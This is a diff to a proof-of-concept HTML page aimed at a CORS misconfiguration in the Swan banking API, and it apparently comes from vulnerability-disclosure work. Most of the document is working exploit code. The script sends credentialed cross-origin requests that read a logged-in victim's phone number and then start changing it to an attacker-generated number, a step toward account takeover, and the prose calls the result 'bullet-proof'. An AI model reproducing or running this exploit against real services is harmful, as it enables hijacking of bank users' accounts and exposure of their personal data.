@@ -1,66 +1,81 @@
-<!DOCTYPE html><meta charset="utf-8">
+- ### Why your earlier test “didn’t work”
++ ### Why previous attempts failed
+
+1. **No `api.swan.io` cookie present** → GraphQL returned “Forbidden”.  
+2. **Invalid dummy new number format** → fallback new number didn’t comply with E.164, so server returned 400.  
+
+Neither issue affects the core finding: **any Origin** is reflected and **credentials** are allowed, so admin-only mutations can be invoked cross-site.
+
+---
+
+## Bullet-proof PoC: `index.html`
+
+```html
+<!DOCTYPE html>
+<meta charset="utf-8">
 <title>Swan CORS Critical PoC</title>
 <style>
- body{font-family:system-ui;margin:2rem;color:#111}
- pre{background:#f8f8f8;padding:1rem;border:1px solid #e1e1e1;overflow:auto}
- code{color:#c7254e;background:#f9f2f4}
+  body { font-family: system-ui; margin: 2rem; color: #111 }
+  pre  { background: #f8f8f8; padding: 1rem; border: 1px solid #e1e1e1; overflow: auto }
+  code { color: #c7254e; background: #f9f2f4 }
+  .success { color: green }
+  .error   { color: red }
 </style>
 
 <h2>⚠️ Swan Banking – Critical CORS Misconfiguration PoC ⚠️</h2>
-<p>This page is hosted on <strong id="origin"></strong>.  
-If the browser already holds <code>api.swan.io</code> cookies, every request
-below runs automatically – no JWT, no
-<code>X-Swan-Authenticator-Token</code> – because
-<code>Access-Control-Allow-Origin</code> echoes any value and
-<code>Access-Control-Allow-Credentials: true</code> lets the browser
-forward cookies.</p>
+<p>This page is served from <strong id="origin"></strong>.  
+All requests below run <em>automatically</em> with your <code>api.swan.io</code> cookies
+(no JWT, no custom header).</p>
 
-<h3>Live log</h3><pre id="log">Running…</pre>
+<pre id="log">Running…</pre>
 
 <script>
-const log  = t => (document.getElementById('log').textContent += t + '\n');
-document.getElementById('origin').textContent = location.origin;
+  const log = line => document.getElementById('log').textContent += line + '\n';
+  document.getElementById('origin').textContent = location.origin;
 
-/* ---------------- helper ---------------- */
-async function gql(path, query){
-  const r = await fetch("https://api.swan.io"+path,{
-    method:"POST", credentials:"include",
-    headers:{ "Content-Type":"application/json" },
-    body:JSON.stringify({query})
-  });
-  const body = await r.text();
-  log(`=== ${path} ===\nStatus: ${r.status} ${r.statusText}\n${body}\n`);
-  return {status:r.status, body:JSON.parse(body)};
-}
+  async function gql(path, query) {
+    const res = await fetch('https://api.swan.io' + path, {
+      method: 'POST',
+      credentials: 'include',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ query })
+    });
+    const text = await res.text();
+    log(`=== ${path} ===\nStatus: ${res.status} ${res.statusText}\n${text}\n`);
+    return { status: res.status, data: JSON.parse(text).data };
+  }
 
-/* ---------- 1) get victim’s current number (if cookie present) ---------- */
-let oldN = null;
-gql("/admin-auth/graphql","{ user { mobilePhoneNumber } }")
-.then(({status,body})=>{
-    if(status===200 && body.data && body.data.user){
-        oldN = body.data.user.mobilePhoneNumber;
-        log("[+] Victim’s current phone: "+oldN+"\n");
-    }else{
-        log("[!] Could not read phone – probably not logged in.\n    Falling back to dummy old number.\n");
-        oldN="+33600000002";
+  (async () => {
+    // 1) Try to read victim’s phone
+    let oldN = '+33600000002';
+    const whoami = await gql('/admin-auth/graphql', '{ user { mobilePhoneNumber } }');
+    if (whoami.status === 200 && whoami.data && whoami.data.user) {
+      oldN = whoami.data.user.mobilePhoneNumber;
+      log(`✅ Read victim’s phone: ${oldN}\n`);
+    } else {
+      log(`⚠️ Could not read phone (unauthenticated) – using dummy: ${oldN}\n`);
     }
 
-    /* ---------- 2) queue phone-number change ---------- */
-    const rand = String(Math.floor(100000+Math.random()*900000));
-    const newN = "+3367"+rand;
-    const mutation=`mutation{
-      startPhoneNumberModification(input:{
-        oldPhoneNumber:"${oldN}",
-        newPhoneNumber:"${newN}"
-      }){
-        __typename
-        ... on StartPhoneNumberModificationSuccessPayload{
-          phoneNumberModification{ id }
+    // 2) Generate a valid new number: +33 6 XXXXXXXX (8 digits)
+    const rand8 = () => Math.floor(10000000 + Math.random() * 90000000);
+    const newN = '+336' + String(rand8()).slice(1);
+    log(`▶ Attempting change from ${oldN} → ${newN}\n`);
+
+    // 3) Queue the phone-change mutation
+    const mut = `
+      mutation {
+        startPhoneNumberModification(input:{
+          oldPhoneNumber:"${oldN}",
+          newPhoneNumber:"${newN}"
+        }) {
+          __typename
+          ... on StartPhoneNumberModificationSuccessPayload {
+            phoneNumberModification { id }
+          }
+          ... on PhoneNumberModificationAlreadyExistsRejection { message }
+          ... on TooManyPhoneNumberModificationRejection { message }
         }
-        ... on PhoneNumberModificationAlreadyExistsRejection{ message }
-        ... on TooManyPhoneNumberModificationRejection{ message }
-      }}`
-    return gql("/admin-auth/graphql",mutation)
-           .then(()=>log("[+] Attempted new number: "+newN));
-});
+      }`;
+    await gql('/admin-auth/graphql', mut);
+  })();
 </script>
